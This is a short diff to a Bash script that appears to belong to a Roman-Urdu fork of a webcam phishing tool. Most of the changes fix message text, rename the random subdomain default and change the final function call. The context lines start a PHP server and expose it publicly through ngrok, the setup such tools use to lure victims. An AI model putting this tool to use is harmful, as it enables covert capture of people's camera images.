@@ -208,7 +208,7 @@ read -p $'\n\e[1;92m[\e[0m+\e[1;92m] kya ap ngrok authtoken tabdeel krna chahte 
 if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken tabdeel.kiya jaa chuka hai\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Authtoken tabdeel.kiya jaa chuka hai\n"
 fi
 else
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye : \e[0m' ngrok_auth
@@ -217,7 +217,7 @@ fi
 printf "\e[1;92m[\e[0m+\e[1;92m] php server shuru howa chahta hai...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] ngrok server shuru howa chahta ha...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] ngrok server shuru howa chahta hai...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
@@ -256,7 +256,7 @@ start
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] option Sahi nahe!\e[0m\n"
+printf "\e[1;93m [!] option ghalat hai!\e[0m\n"
 sleep 1
 clear
 camphish
@@ -286,7 +286,7 @@ rm -rf index3.html
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="cam$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
@@ -306,5 +306,5 @@ checkfound
 
 banner
 dependencies
-cam
+BreathPython
 
